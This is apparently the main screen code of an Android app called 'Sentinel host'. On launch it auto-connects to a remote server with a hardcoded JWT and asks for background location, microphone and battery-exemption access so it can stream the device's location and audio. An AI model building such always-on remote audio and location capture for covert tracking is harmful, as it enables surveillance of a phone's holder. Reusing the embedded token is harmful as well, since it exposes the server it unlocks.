package com.sentinel.host.ui

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat
import androidx.lifecycle.lifecycleScope
import com.sentinel.host.domain.model.ConnectionState
import com.sentinel.host.service.AudioStreamer
import com.sentinel.host.service.ConnectionSupervisor
import com.sentinel.host.service.LocationStreamer
import com.sentinel.host.domain.usecase.ConnectUseCase
import dagger.hilt.android.AndroidEntryPoint
import kotlinx.coroutines.launch
import javax.inject.Inject

@AndroidEntryPoint
class MainActivity : ComponentActivity() {

    companion object {
        private const val TAG = "Sentinel:Main"
        private const val SERVER_URL = "wss://project-sentinel-rwt4.onrender.com/ws"
        private const val JWT_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJIT1NULTAwMSIsImlzcyI6InByb2plY3Qtc2VudGluZWwiLCJzdWIiOiJIT1NULTAwMSIsImV4cCI6MTgxNTg5MDcwMywiaWF0IjoxNzg0MzU0NzAzfQ.l_yJzhLSY0Kuhudn6-5W81pyv77NBZkDsZVdXgWKeSA"
    }

    @Inject lateinit var connectUseCase: ConnectUseCase
    @Inject lateinit var connectionSupervisor: ConnectionSupervisor
    @Inject lateinit var locationStreamer: LocationStreamer
    @Inject lateinit var audioStreamer: AudioStreamer



    // Step 1: Request foreground location + microphone + notifications
    private val corePermissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        Log.i(TAG, "Core permissions: $results")
        updateStreamerPermissions()

        // Step 2: After foreground location granted, request background location
        if (results[Manifest.permission.ACCESS_FINE_LOCATION] == true) {
            requestBackgroundLocation()
        }

        // Step 3: Request battery optimization exemption
        requestBatteryOptimization()
    }

    // Step 2: Background location (requires separate request on Android 10+)
    private val backgroundLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { granted ->
        Log.i(TAG, "Background location granted: $granted")
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        setContent {
            SentinelHostApp()
        }

        // Auto-connect on launch
        autoConnect()
    }

    private fun autoConnect() {
        // Set streamer permissions from current grant state BEFORE connecting.
        // This ensures hasPermission is true when ConnectionSupervisor reaches Ready
        // and calls locationStreamer.start() / audioStreamer.start().
        updateStreamerPermissions()

        // Request any missing permissions immediately
        requestAllPermissions()

        // Start the connection
        connectionSupervisor.start()

        lifecycleScope.launch {
            Log.i(TAG, "Auto-connecting to $SERVER_URL")
            val result = connectUseCase.execute(SERVER_URL, JWT_TOKEN)
            result.onSuccess {
                Log.i(TAG, "Connected and registered successfully")
            }
            result.onFailure { error ->
                Log.e(TAG, "Auto-connect failed: ${error.message}")
            }
        }
    }

    private fun requestAllPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.RECORD_AUDIO
        )

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        // Filter out already-granted permissions
        val needed = permissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (needed.isNotEmpty()) {
            Log.i(TAG, "Requesting permissions: $needed")
            corePermissionLauncher.launch(needed.toTypedArray())
        } else {
            Log.i(TAG, "All core permissions already granted")
            updateStreamerPermissions()
            requestBackgroundLocation()
            requestBatteryOptimization()
        }
    }

    private fun requestBackgroundLocation() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                != PackageManager.PERMISSION_GRANTED
            ) {
                backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
            }
        }
    }

    private fun requestBatteryOptimization() {
        val pm = getSystemService(POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            try {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                    data = Uri.parse("package:$packageName")
                }
                startActivity(intent)
            } catch (e: Exception) {
                Log.w(TAG, "Could not request battery optimization exemption: ${e.message}")
            }
        }
    }

    /**
     * Sets hasPermission on LocationStreamer and AudioStreamer based on actual grant state.
     * This triggers the streamers to start sending data.
     */
    private fun updateStreamerPermissions() {
        val locationGranted = ContextCompat.checkSelfPermission(
            this, Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED

        val audioGranted = ContextCompat.checkSelfPermission(
            this, Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED

        Log.i(TAG, "Updating streamer permissions: location=$locationGranted, audio=$audioGranted")

        locationStreamer.hasPermission = locationGranted
        audioStreamer.hasPermission = audioGranted

        // If streamers were waiting for permissions, start them now
        if (locationGranted && connectionSupervisor.state.value is ConnectionState.Ready) {
            locationStreamer.start()
        }
        if (audioGranted && connectionSupervisor.state.value is ConnectionState.Ready) {
            audioStreamer.start()
        }
    }
}
